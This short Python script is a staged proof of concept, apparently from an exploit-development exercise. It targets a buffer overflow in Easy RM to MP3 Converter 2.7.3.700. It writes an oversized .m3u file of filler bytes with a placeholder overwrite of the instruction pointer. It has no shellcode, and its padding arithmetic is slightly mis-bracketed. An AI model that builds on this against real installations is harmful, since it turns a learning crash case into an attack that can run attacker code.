######################################################### 

##      Easy RM to MP3 Converter Buffer Overflow       ## 

##            Ver 2.7.3.700 29 Sept 2006               ##       

##                  Exploit V-03                       ## 

######################################################### 

### Initialize a large variable 'junk' to overflow the buffer with A's want up to the EIP
junk = '\x41' * 26049 

### Initialize a new variable EIP 
### \x42 is B
eip = '\x42' * 4 

### Initialize a new  variable padding to preserve the size of 
### the exploit buffer e.g if we know 30000 crashes it
padding = '\x43' * (30000 - len(junk) + len(eip)) 

### Build the buffer 
buffer = junk + eip + padding 

### Output the contents of the 'buffer' variable to the terminal 
### Use python [exploit_script].py > [version]-exploit.m3u 
print(buffer) 

 
